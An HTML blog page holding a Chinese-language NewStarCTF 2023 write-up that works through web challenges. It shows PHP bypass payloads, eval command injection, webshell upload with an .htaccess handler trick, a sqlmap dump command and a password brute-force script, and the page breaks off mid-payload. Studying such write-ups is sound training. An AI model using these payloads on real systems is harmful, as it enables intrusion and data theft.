@@ -1,0 +1,1296 @@
+<!doctype html><html lang=zh><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content="light dark" name=color-scheme><title>NewStarCTF wp</title><link href=/img/favicon-32x32.png rel=icon sizes=32x32 type=image/png><link href=/img/favicon-16x16.png rel=icon sizes=16x16 type=image/png><link href=/img/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><style>body{--primary-color:#5871a2;--primary-pale-color:#5871a210;--text-color:#3c4043;--text-pale-color:#a3a5a9;--bg-color:#fff;--highlight-mark-color:#5f75b035;--blockquote-color:#8e8d91;--callout-note-color:#5871a2;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body.dark{--primary-color:#5d77ac;--primary-pale-color:#5d77ac20;--text-color:#9197a5;--text-pale-color:#656a74;--bg-color:#18191b;--highlight-mark-color:#5f75b035;--blockquote-color:#747983;--callout-note-color:#5d77ac;--callout-important-color:#8062b0;--callout-warning-color:#936e51;--callout-alert-color:#bc5252;--callout-question-color:#477389;--callout-tip-color:#3c8460}body{--main-font:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--code-font:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--homepage-max-width:768px;--main-max-width:768px;--avatar-size:56px;--homepage-font-size:16px;--homepage-line-height:1.75;--paragraph-font-size:16px;--paragraph-line-height:1.75;--aside-font-size:15px;--img-border-radius:0px;--detail-border-radius:0px;--dark-mode-img-brightness:.75;--dark-mode-chart-brightness:.75;--inline-code-border-radius:2px;--inline-code-bg-color:var(--primary-pale-color);--block-code-border-radius:0px;--block-code-border-color:var(--primary-color);--detail-border-color:var(--primary-color)}</style><link href=/main.css rel=stylesheet><link href=/hl-light.css id=hl rel=stylesheet><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css integrity=sha384-nB0miv6/jRmo5UMMR1wu3Gz6NLsoTkbqJghGIsx//Rlm+ZU03BU6SQNC66uf4l5+ rel=stylesheet><script crossorigin defer integrity=sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm/Yr2r3Dy4lfFg src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js></script><script crossorigin defer integrity=sha384-43gviWU0YVjaDtb/GhzOouOXtZMP/7XUzwPTstBeZFe/+rCMvRwr4yROQP43s0Xk src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js></script><script crossorigin defer integrity=sha384-HORx6nWi8j5/mYA+y57/9/CZc5z8HnEw4WUZWy5yOn9ToKBv1l58vJaufFAn9Zzi src=https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js></script><script>document.addEventListener(`DOMContentLoaded`,(()=>{let b=`\$`,a=`\$\$`;renderMathInElement(document.body,{delimiters:[{left:a,right:a,display:!0},{left:b,right:b,display:!1},{left:`\\\\(`,right:`\\\\)`,display:!1},{left:`\\\\[`,right:`\\\\]`,display:!0}],throwOnError:!1})}))</script><body class=post><script>const theme=sessionStorage.getItem(`theme`);const match=window.matchMedia(`(prefers-color-scheme: dark)`).matches;if(theme&&theme==`dark`||!theme&&match){document.body.classList.add(`dark`);const a=document.querySelector(`link#hl`);if(a)a.href=`/hl-dark.css`}</script><header class=blur><div id=header-wrapper><nav><a class=instant href=/>lbsucceed</a><button aria-label="toggle expand" class=separator id=toggler>::</button><span class="wrap left fold">{</span><a class=instant href=/posts>posts</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/projects>projects</a><span class="wrap-separator fold">,</span><a class="instant fold" href=/about>about</a><span class="wrap right fold">} ;</span></nav><div id=btns><a aria-label="rss feed" href=/posts/feed.xml id=rss-btn><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 17C5.20914 17 7 18.7909 7 21H3V17ZM3 10C9.07513 10 14 14.9249 14 21H12C12 16.0294 7.97056 12 3 12V10ZM3 3C12.9411 3 21 11.0589 21 21H19C19 12.1634 11.8366 5 3 5V3Z" fill=currentColor></path></svg></a><button aria-label="theme switch" id=theme-toggle><span class=moon-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill=currentColor></path></svg></span> <span class=sun-icon><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill=currentColor></path></svg></span></button><button aria-label="table of content" id=toc-toggle><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M3 4H21V6H3V4ZM3 11H15V13H3V11ZM3 18H21V20H3V18Z" fill=currentColor></path></svg></button></div></div></header><dialog id=rss-mask><div><a href=https://lbsucceed.github.io/posts/feed.xml>https://lbsucceed.github.io/posts/feed.xml</a><button data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' aria-label=copy autofocus data-link=https://lbsucceed.github.io/posts/feed.xml><svg viewbox="0 0 24 24" height=20 width=20 xmlns=http://www.w3.org/2000/svg><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill=currentColor></path></svg></button></div></dialog><div id=wrapper><div id=blank></div><aside><nav><ul><li><a class=h2 href=#newstarctf-2023>NewStarCTF 2023</a> <ul><li><a class=h3 href=#web>Web</a><li><a class=h3 href=#misc>Misc</a><li><a class=h3 href=#crypto>Crypto</a><li><a class=h3 href=#reverse>Reverse</a></ul></ul></nav><button aria-label="back to top" id=back-to-top><svg viewbox="0 0 24 24" height=24 width=24 xmlns=http://www.w3.org/2000/svg><path d="M11.9997 10.8284L7.04996 15.7782L5.63574 14.364L11.9997 8L18.3637 14.364L16.9495 15.7782L11.9997 10.8284Z" fill=currentColor></path></svg></button></aside><main><div><div data-check-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z" fill="currentColor"></path></svg>' data-copy-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z" fill="currentColor"></path></svg>' id=copy-cfg style=display:none></div><article data-backlink-icon='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path d="M9.41421 8L18.0208 16.6066L16.6066 18.0208L8 9.41421V17H6V6H17V8H9.41421Z" fill="currentColor"></path></svg>' class=prose><h1>NewStarCTF wp</h1><div id=post-info><div id=date><span id=publish>2023-04-15</span><span>Updated on <span id=updated>2025-06-09</span></span></div><div id=tags><a class=instant href=https://lbsucceed.github.io/tags/engineer><span>#</span>engineer</a></div></div><blockquote class="callout alert hidden" data-alert-text-after=" days ago and may be out of date." data-alert-text-before="This article was last updated " data-days=120 id=outdate_alert><div class=content></div></blockquote><h1 id=newstarctf-2023>NewStarCTF 2023<a aria-label="Anchor link for: newstarctf-2023" class=zola-anchor href=#newstarctf-2023 style=visibility:hidden></a></h1><h2 id=web>Web<a aria-label="Anchor link for: web" class=zola-anchor href=#web style=visibility:hidden></a></h2><h3 id=week-1-xie-lou-de-mi-mi>[Week 1]泄漏的秘密<a aria-label="Anchor link for: week-1-xie-lou-de-mi-mi" class=zola-anchor href=#week-1-xie-lou-de-mi-mi style=visibility:hidden></a></h3><blockquote><p>注意，此部分图床已坏</blockquote><p>通过使用 dirsearch 扫描可以得到两个文件可访问 <code>robots.txt</code> 和 <code>www.zip</code> 。<p>robots.txt 内容如下<pre class=z-code><code><span class="z-text z-plain">PART ONE: flag{r0bots_1s_s0_us3ful
+</span></code></pre><p>www.zip/index.php 内容如下<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">$PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
+</span><span class="z-text z-plain">echo "&LTh1>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&LT/h1>";
+</span></code></pre><p>即可得到 flag 如下<pre class=z-code><code><span class="z-text z-plain">flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
+</span></code></pre><h3 id=week-1-begin-of-upload>[Week 1]Begin of Upload<a aria-label="Anchor link for: week-1-begin-of-upload" class=zola-anchor href=#week-1-begin-of-upload style=visibility:hidden></a></h3><p>通过查看源代码可以发现使用的是前端过滤，通过在浏览器中禁止 JavaScript 后即可直接上传 shell 文件。<p>通过蚁剑一把梭即可得到 flag（文件在 /fllll4g）。<pre class=z-code><code><span class="z-text z-plain">flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
+</span></code></pre><h3 id=week-1-begin-of-http>[Week 1]Begin of HTTP<a aria-label="Anchor link for: week-1-begin-of-http" class=zola-anchor href=#week-1-begin-of-http style=visibility:hidden></a></h3><h4 id=0x00-get><strong>0x00 GET</strong><a aria-label="Anchor link for: 0x00-get" class=zola-anchor href=#0x00-get style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">请使用 GET方式 来给 ctf 参数传入任意值来通过这关
+</span></code></pre><p>通过 param 传入 ctf 参数即可，如下<pre class=z-code><code><span class="z-text z-plain">http://node4.buuoj.cn:29844/?ctf=123
+</span></code></pre><h4 id=0x01-post><strong>0x01 POST</strong><a aria-label="Anchor link for: 0x01-post" class=zola-anchor href=#0x01-post style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 
+</span><span class="z-text z-plain">如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里
+</span></code></pre><p>查看源代码可以发现<pre class=z-code><code><span class="z-text z-plain">&LT!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
+</span></code></pre><p>通过 base64 解密可以得到 Secret 值为 <code>n3wst4rCTF2023g00000d</code> ，通过 body 传入即可。<pre class=z-code><code><span class="z-text z-plain">secret=n3wst4rCTF2023g00000d
+</span></code></pre><h4 id=0x02-cookie><strong>0x02 Cookie</strong><a aria-label="Anchor link for: 0x02-cookie" class=zola-anchor href=#0x02-cookie style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关
+</span></code></pre><p>通过设置 Cookie 如下<pre class=z-code><code><span class="z-text z-plain">Cookie: power=ctfer
+</span></code></pre><h4 id=0x03-user-agent><strong>0x03 User-Agent</strong><a aria-label="Anchor link for: 0x03-user-agent" class=zola-anchor href=#0x03-user-agent style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！
+</span></code></pre><p>通过设置 User-Agent 如下<pre class=z-code><code><span class="z-text z-plain">User-Agent: NewStarCTF2023
+</span></code></pre><h4 id=0x04-referer><strong>0x04 Referer</strong><a aria-label="Anchor link for: 0x04-referer" class=zola-anchor href=#0x04-referer style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">希望你是从 newstarctf.com 访问到这个关卡的
+</span></code></pre><p>通过设置 Referer 如下<pre class=z-code><code><span class="z-text z-plain">Referer: newstarctf.com
+</span></code></pre><h4 id=0x05-x-real-ip><strong>0x05 X-Real-Ip</strong><a aria-label="Anchor link for: 0x05-x-real-ip" class=zola-anchor href=#0x05-x-real-ip style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">最后一关了！只有 本地用户 可以通过这一关
+</span></code></pre><p>通过设置 X-Real-Ip 如下<pre class=z-code><code><span class="z-text z-plain">X-Real-Ip: 127.0.0.1
+</span></code></pre><p>就可以得到 flag 了。<h3 id=week-1-errorflask>[Week 1]ErrorFlask<a aria-label="Anchor link for: week-1-errorflask" class=zola-anchor href=#week-1-errorflask style=visibility:hidden></a></h3><p>通过题目得知需要从 Flask 中的报错中寻找答案，网页回显如下<pre class=z-code><code><span class="z-text z-plain">give me number1 and number2,i will help you to add
+</span></code></pre><p>通过输入字符串类型的值即可得到报错，Payload 如下<pre class=z-code><code><span class="z-text z-plain">?number1=a&number2=b
+</span></code></pre><p>得到回显后点击 <code>return "not ssti,flag in source code~"+str(int(num1)+int(num2))</code> 即可得到 flag ，不方便复制可以 F12 来复制。<pre class=z-code><code><span class="z-text z-plain">flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
+</span></code></pre><h3 id=week-1-begin-of-php>[Week 1]Begin of PHP<a aria-label="Anchor link for: week-1-begin-of-php" class=zola-anchor href=#week-1-begin-of-php style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">error_reporting(0);
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if(isset($_GET['key1']) && isset($_GET['key2'])){
+</span><span class="z-text z-plain">    echo "=Level 1=&LTbr>";
+</span><span class="z-text z-plain">    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
+</span><span class="z-text z-plain">        $flag1 = True;
+</span><span class="z-text z-plain">    }else{
+</span><span class="z-text z-plain">        die("nope,this is level 1");
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if($flag1){
+</span><span class="z-text z-plain">    echo "=Level 2=&LTbr>";
+</span><span class="z-text z-plain">    if(isset($_POST['key3'])){
+</span><span class="z-text z-plain">        if(md5($_POST['key3']) === sha1($_POST['key3'])){
+</span><span class="z-text z-plain">            $flag2 = True;
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }else{
+</span><span class="z-text z-plain">        die("nope,this is level 2");
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if($flag2){
+</span><span class="z-text z-plain">    echo "=Level 3=&LTbr>";
+</span><span class="z-text z-plain">    if(isset($_GET['key4'])){
+</span><span class="z-text z-plain">        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
+</span><span class="z-text z-plain">            $flag3 = True;
+</span><span class="z-text z-plain">        }else{
+</span><span class="z-text z-plain">            die("nope,this is level 3");
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if($flag3){
+</span><span class="z-text z-plain">    echo "=Level 4=&LTbr>";
+</span><span class="z-text z-plain">    if(isset($_GET['key5'])){
+</span><span class="z-text z-plain">        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
+</span><span class="z-text z-plain">            $flag4 = True;
+</span><span class="z-text z-plain">        }else{
+</span><span class="z-text z-plain">            die("nope,this is level 4");
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if($flag4){
+</span><span class="z-text z-plain">    echo "=Level 5=&LTbr>";
+</span><span class="z-text z-plain">    extract($_POST);
+</span><span class="z-text z-plain">    foreach($_POST as $var){
+</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$var)){
+</span><span class="z-text z-plain">            die("nope,this is level 5");
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    if($flag5){
+</span><span class="z-text z-plain">        echo file_get_contents("/flag");
+</span><span class="z-text z-plain">    }else{
+</span><span class="z-text z-plain">        die("nope,this is level 5");
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span></code></pre><h4 id=0x00-level-1><strong>0x00 Level 1</strong><a aria-label="Anchor link for: 0x00-level-1" class=zola-anchor href=#0x00-level-1 style=visibility:hidden></a></h4><p>md5 绕过，可以通过数组进行绕过，Payload 如下<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2
+</span></code></pre><h4 id=0x01-level-2><strong>0x01 Level 2</strong><a aria-label="Anchor link for: 0x01-level-2" class=zola-anchor href=#0x01-level-2 style=visibility:hidden></a></h4><p>md5 === sha1 绕过，同样可以通过数组进行绕过，Payload 如下（Level 5 中不允许 POST 的值出现任何数字或字母）<pre class=z-code><code><span class="z-text z-plain">key3[]=@
+</span></code></pre><h4 id=0x02-level-3><strong>0x02 Level 3</strong><a aria-label="Anchor link for: 0x02-level-3" class=zola-anchor href=#0x02-level-3 style=visibility:hidden></a></h4><p>strcmp 函数绕过，同样可以通过数组进行绕过，Payload 如下<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2&key4[]=4
+</span></code></pre><h4 id=0x03-level-4><strong>0x03 Level 4</strong><a aria-label="Anchor link for: 0x03-level-4" class=zola-anchor href=#0x03-level-4 style=visibility:hidden></a></h4><p>is_numeric 函数绕过，将 key5 设置为 2024a(任意字符) 即可，Payload 如下<pre class=z-code><code><span class="z-text z-plain">key1[]=1&key2[]=2&key4[]=4&key5=2024a
+</span></code></pre><h4 id=0x04-level-5><strong>0x04 Level 5</strong><a aria-label="Anchor link for: 0x04-level-5" class=zola-anchor href=#0x04-level-5 style=visibility:hidden></a></h4><p><code>extract($_POST);</code> 函数相当于 <code>$name = $_POST['name']</code> 。<p>通过发现缺少了 flag5 变量，说明就需要通过以上方法来造出 flag5，又因为 POST 的值出现任何数字或字母，根据在 PHP 中，只要字符串不为空即为 <code>True</code> 的特性，故 Payload 如下<pre class=z-code><code><span class="z-text z-plain">key3[]=@&flag5=@
+</span></code></pre><p>即可得到 flag。<h3 id=week-1-r-c-e>[Week 1]R!C!E!<a aria-label="Anchor link for: week-1-r-c-e" class=zola-anchor href=#week-1-r-c-e style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
+</span><span class="z-text z-plain">    $password=md5($_POST['password']);
+</span><span class="z-text z-plain">    $code=$_POST['e_v.a.l'];
+</span><span class="z-text z-plain">    if(substr($password,0,6)==="c4d038"){
+</span><span class="z-text z-plain">        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
+</span><span class="z-text z-plain">            eval($code);
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span></code></pre><p>本题需要知道 GET 或 POST 变量名中的非法字符会转化下划线，即 <code>$_POST['e_v.a.l']</code> 需要通过 <code>e[.v.a.l</code> 来传入。<p>并且题目中还存在一个 password，该参数会进行 md5 加密并对比前 6 位需要与 <code>c4d038</code> 一致，可以通过写脚本进行爆破。<pre class=z-code><code><span class="z-text z-plain">import hashlib
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for i in range(0, 99999999):
+</span><span class="z-text z-plain">    if hashlib.md5(str(i).encode(encoding='utf-8')).hexdigest()[:6] == "c4d038":
+</span><span class="z-text z-plain">        print(i)
+</span><span class="z-text z-plain">        break
+</span><span class="z-text z-plain">        
+</span><span class="z-text z-plain"># 114514
+</span></code></pre><p>题目还对部分常见的恶意函数进行了过滤，但是可以通过 反引号 来执行 shell 命令，也可以通过 反斜杠 来进行绕过，Payload 如下<pre class=z-code><code><span class="z-text z-plain">password=114514&e[v.a.l=echo `l\s /`;
+</span></code></pre><p>可以得到回显如下<pre class=z-code><code><span class="z-text z-plain">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
+</span></code></pre><p>构造 Payload 如下即可得到 flag<pre class=z-code><code><span class="z-text z-plain">password=114514&e[v.a.l=echo `tac /fl\ag`;
+</span></code></pre><h3 id=week-1-easylogin>[Week 1]EasyLogin<a aria-label="Anchor link for: week-1-easylogin" class=zola-anchor href=#week-1-easylogin style=visibility:hidden></a></h3><p>随意注册一个账号后登录会进入终端，但在 BurpSuite 中可以发现还有一个特别的请求如下<pre class=z-code><code><span class="z-text z-plain">POST /passport/f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.php
+</span></code></pre><p>该请求的回显如下<pre class=z-code><code><span class="z-text z-plain">&LT!-- 恭喜你找到flag -->
+</span><span class="z-text z-plain">&LT!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 -->
+</span><span class="z-text z-plain">&LT!-- https://b23.tv/BV1SD4y1J7uY -->
+</span><span class="z-text z-plain">&LT!-- 庆祝一下吧！ -->
+</span></code></pre><p>很显然，点进去一看是个诈骗 flag，继续研究终端的 JavaScript 源码发现这个终端是个虚假的终端，但在其中还能发现一个 <code>admin</code> 账号，并且存在一个提示 <code>Maybe you need BurpSuite.</code> ，看来用 bp 这方向没错，那就开始爆破寻找 <code>admin</code> 账号的密码。<p>从图中已知输入的密码会进行 md5 加密，通过编写 Python 脚本进行爆破，我这里爆破用的是 rockyou.txt ，可以在 Kali 中找到。<pre class=z-code><code><span class="z-text z-plain">import requests
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
+</span><span class="z-text z-plain">    for line in file:
+</span><span class="z-text z-plain">        line = line.strip()
+</span><span class="z-text z-plain">        data = {"un": "admin", "pw": f"{hashlib.md5(str(line).encode(encoding='utf-8')).hexdigest()}", "rem": "0"}
+</span><span class="z-text z-plain">        ret = requests.post('http://node4.buuoj.cn:25956/signin.php', data=data)
+</span><span class="z-text z-plain">        if 'div class="alert alert-success show' in ret.text:
+</span><span class="z-text z-plain">            print(line)
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">            
+</span><span class="z-text z-plain"># 000000 
+</span></code></pre><p>通过将得到的密码手动再进行一次登录操作，就可以得到 flag 了。<h3 id=week-2-include-0-0>[Week 2]include 0。0<a aria-label="Anchor link for: week-2-include-0-0" class=zola-anchor href=#week-2-include-0-0 style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">file=php://filter/read=convert.%2562ase64-encode/resource=flag.php
+</span></code></pre><h3 id=week-2-unserialize>[Week 2]Unserialize？<a aria-label="Anchor link for: week-2-unserialize" class=zola-anchor href=#week-2-unserialize style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">unser=O:4:"evil":1:{s:3:"cmd";s:35:"c\at /th1s_1s_fffflllll4444aaaggggg";}
+</span></code></pre><h3 id=week-2-upload-again>[Week 2]Upload again!<a aria-label="Anchor link for: week-2-upload-again" class=zola-anchor href=#week-2-upload-again style=visibility:hidden></a></h3><h4 id=htaccess-rao-guo-rao-guo>.htaccess 绕过、<code>&LT?</code> 绕过<a aria-label="Anchor link for: htaccess-rao-guo-rao-guo" class=zola-anchor href=#htaccess-rao-guo-rao-guo style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">&LTFilesMatch "shell.jpg">
+</span><span class="z-text z-plain">SetHandler application/x-httpd-php
+</span><span class="z-text z-plain">&LT/FilesMatch>
+</span></code></pre><h3 id=week-2-r-c-e>[Week 2]R!!C!!E!!<a aria-label="Anchor link for: week-2-r-c-e" class=zola-anchor href=#week-2-r-c-e style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">/bo0g1pop.php?star=eval(array_rand(array_flip(getallheaders())));
+</span><span class="z-text z-plain">User-Agent: system("cat /flag");
+</span></code></pre><h3 id=week-2-you-xi-gao-shou>[Week 2]游戏高手<a aria-label="Anchor link for: week-2-you-xi-gao-shou" class=zola-anchor href=#week-2-you-xi-gao-shou style=visibility:hidden></a></h3><p>进入 Console<pre class=z-code><code><span class="z-text z-plain">gameScore=999999999999999
+</span></code></pre><p>运行玩游戏直接白给就可以得到 flag 了。<h3 id=week-2-ez-sql>[Week 2]ez_sql<a aria-label="Anchor link for: week-2-ez-sql" class=zola-anchor href=#week-2-ez-sql style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">$ python sqlmap.py -u http://ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables --dump-all
+</span></code></pre><p>可以爆破数据库名字为 <code>ctf</code> ，表名 <code>here_is_flag</code> ，字段名 <code>flag</code> ，以及 flag。<h3 id=week-3-include-pear>[Week 3]Include 🍐<a aria-label="Anchor link for: week-3-include-pear" class=zola-anchor href=#week-3-include-pear style=visibility:hidden></a></h3><p>这题考察的是 LFI to RCE。<p>打开页面源代码如下<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">    error_reporting(0);
+</span><span class="z-text z-plain">    if(isset($_GET['file'])) {
+</span><span class="z-text z-plain">        $file = $_GET['file'];
+</span><span class="z-text z-plain">        
+</span><span class="z-text z-plain">        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
+</span><span class="z-text z-plain">            die('hacker!');
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">        
+</span><span class="z-text z-plain">        include($file.".php");
+</span><span class="z-text z-plain">        # Something in phpinfo.php!
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    else {
+</span><span class="z-text z-plain">        highlight_file(__FILE__);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">?>
+</span></code></pre><p>通过构造 payload 如下<pre class=z-code><code><span class="z-text z-plain">file=phpinfo
